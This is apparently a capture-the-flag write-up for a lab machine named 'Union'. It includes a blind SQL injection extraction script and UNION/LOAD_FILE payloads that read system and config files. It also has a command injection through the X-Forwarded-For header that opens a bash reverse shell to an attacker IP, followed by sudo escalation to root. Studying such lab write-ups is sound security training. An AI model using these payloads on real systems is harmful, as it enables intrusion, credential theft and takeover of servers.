---
created: 2025-07-29
---

📅 `2025-07-29`

#sql-injection #command-injection #sudo #code-inspection #php

----

## 🖥️ Box Info

| ️🏷️ Name         |   `Union`  |
| --------------- | ---        |
| 📆 Release Date |  `2021-11-22` |
| 🌐 IP Address   |  `10.10.11.128`   |
| 🖥️ OS           |   `Linux`  |
| 🎯 Difficulty   |   `Medium`  |

----

## 🧠 Summary


**🧩 Key Concepts:** 

- Non-obvious blind and `UNION`-based `SQL` injection
- File read via `SQL` injection using `LOAD_FILE`
- Read `PHP` source code
- Code injection via `HTTP` header

**🛠️ Tools:**  

- `BurpSuite`

**📚 Learned:**  

- Always try `SQL` injection and command injection on user input fields.
- Even if only blind injection seems to work, a `UNION` injection may still be possible.
- Always read the web application's source code. Look for config files or any interesting function.

----

## 🌐 Port Scan

- **TCP**: 80 (22 opens after submitting the flag)
- **UDP**: None

---

## 🔍 Enumeration

Port 80 hosts a simple web app with a field for checking whether a player name is available.

![[Pasted image 20250729014938.png]]

I found these interesting files using `ffuf` with `-e .php`:

```shell
/index.php
/challenge.php
/config.php
/firewall.php
```

`/config.php` shows a blank screen, meaning that it's getting executed and has no code that renders. `/firewall.php` returns 403 Forbidden. `/challenge.php` has a field for entering a flag.

The main site had the field shown above, so I decided to try `SQL` injection. I saw these differences in `BurpSuite`:

Sending a player name returns a link:

![[Pasted image 20250729015042.png]]

Sending a player name with an `SQL` injection payload returns a message mentioning `ippsec`:

![[Pasted image 20250729015139.png]]

This is clearly `SQL` injection.


---

## 🪜 Foothold / User

After some testing, I wrote the following script to extract data through the blind `SQL` injection (I didn't know yet that it was also `UNION`-based):

```python
import string

import pwn
import requests

URL = "http://10.10.11.128"
RED = "\033[0;31m"
RESET = "\033[0m"


def main():
    alphabet = string.ascii_letters + string.digits + string.punctuation
    password = ""
    match = True
    index = 1

    try:
        with pwn.log.progress("Current guess") as p:
            while match:
                p.status(f"{password}")
                for char in alphabet:
                    data = {
                        "player": f"test'OR SUBSTRING((SELECT table_name FROM information_schema.tables where table_schema='november' LIMIT 0,1), {index}, 1) = '{char}' -- -"
                    }
                    r = requests.post(URL, data=data)

                    # Condition for match
                    if "ippsec" in r.text:
                        match = True
                        password += char
                        index += 1
                        break

                    match = False

            p.success(f"{password}")

    except KeyboardInterrupt:
        print(f"\n\n{RED}[-]{RESET} User Interrupted")


if __name__ == "__main__":
    main()
```

>[!note]
>Later I found a `UNION` injection, which made this script unnecessary.

I found tables `flag` and `players`. The `flag` table is relevant to `challenge.php`:

![[Pasted image 20250729123534.png]]

I changed the payload to this:

```python
data = {
    "player": f"test'OR SUBSTRING((SELECT * FROM flag LIMIT 0,1), {index}, 1) = '{char}' -- -"
}
```

And got this:

```shell
[+] Current guess: uhc{f1rst_5tep_2_qualify}
```

After submitting it:

![[Pasted image 20250729123701.png]]

Submitting the flag seems to have changed something on the server.

Previously only port 80 was open. Another port scan showed this:

```shell
sudo nmap 10.10.11.128

22/tcp open  ssh
80/tcp open  http
```

Port 22 is now open.

I decided to enumerate the table `players`:

```python
data = {
    "player": f"test'OR SUBSTRING((SELECT player FROM players LIMIT 0,1), {index}, 1) = '{char}' -- -"
}
```

And I found 5 entries:

```
ippsec
celesian
big0us
luska
tinyboy
```

Brute-forcing those users over `SSH` didn't work.

I found that this payload also works:

```shell
test'UNION+SELECT+player+from+players--+-
```

Now we can enumerate without relying on blind `SQL` injection.

I tried to read files with `LOAD_FILE` using this payload:

```shell
test'UNION+SELECT+LOAD_FILE("/etc/passwd")--+-
```

![[Pasted image 20250729131200.png]]

We can read files, so I read `/config.php`.

![[Pasted image 20250729131637.png]]

Credentials:

- `uhc`:`uhc-11qual-global-pw`

I tried them with `SSH` and they worked:

```shell
uhc@union:~$ id
uid=1001(uhc) gid=1001(uhc) groups=1001(uhc)
uhc@union:~$ ls
user.txt
```

Got user.

---

## 🛡️ Privilege Escalation

Our user has no `sudo` permissions, so I looked at how the firewall works. Here is `firewall.php`:

```php
<SNIP>

if (!($_SESSION['Authenticated'])) {
  echo "Access Denied";
  exit;
}

<SNIP>

<?php
  if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
  } else {
    $ip = $_SERVER['REMOTE_ADDR'];
  };
  system("sudo /usr/sbin/iptables -A INPUT -s " . $ip . " -j ACCEPT");
?>
```

Looking closer we can see that the program executes a dynamically built string including user-controllable input.

The `$_SERVER['HTTP_X_FORWARDED_FOR']` variable references the `X-Forwarded-For` header sent by the client. This means we can achieve code execution as the user running the web server by including malicious input in the header:

>[!note]
>It gets executed as the user running the web server, not root, since the command affected by `sudo` is `/usr/sbin/iptables`, not whatever we inject.

Let's get a reverse shell.

```shell
X-Forwarded-For: 127.0.0.1;bash -c 'bash -i >& /dev/tcp/10.10.14.9/1234 0>&1'
```

And we got a shell as `www-data`:

```shell
listen linux 1234

info: Listening on 0.0.0.0:1234
info: Connection Received

www-data@union:~/html$ sudo -l
Matching Defaults entries for www-data on union:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on union:
    (ALL : ALL) NOPASSWD: ALL
```

User `www-data` can run any command with `sudo`. That makes root straightforward:

```shell
www-data@union:~/html$ sudo bash

root@union:/var/www/html# id
uid=0(root) gid=0(root) groups=0(root)
```

Rooted.